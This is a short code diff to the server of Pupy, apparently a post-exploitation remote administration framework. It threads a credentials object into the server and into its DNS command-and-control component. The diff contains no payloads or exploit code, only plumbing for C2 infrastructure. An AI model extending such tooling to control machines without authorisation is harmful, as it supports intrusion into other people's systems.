@@ -47,7 +47,7 @@ from . import PupyClient
 import os.path
 
 class PupyServer(threading.Thread):
-    def __init__(self, config):
+    def __init__(self, config, credentials):
         super(PupyServer, self).__init__()
         self.daemon = True
         self.server = None
@@ -61,6 +61,8 @@ class PupyServer(threading.Thread):
         self._current_id_lock = threading.Lock()
 
         self.config = config or PupyConfig()
+        self.credentials = credentials or PupyCredentials()
+
         self.port = self.config.getint('pupyd', 'port')
         self.address = self.config.getip('pupyd', 'address') or ''
 
@@ -108,12 +110,9 @@ class PupyServer(threading.Thread):
                 dnsport = 5454
 
             self.dnscnc = PupyDnsCnc(
-                fdqn,
                 igd=self.igd,
-                port=dnsport,
-                connect_port=self.port,
-                connect_transport=self.transport,
-                config=self.config
+                config=self.config,
+                credentials=self.credentials
             )
 
 
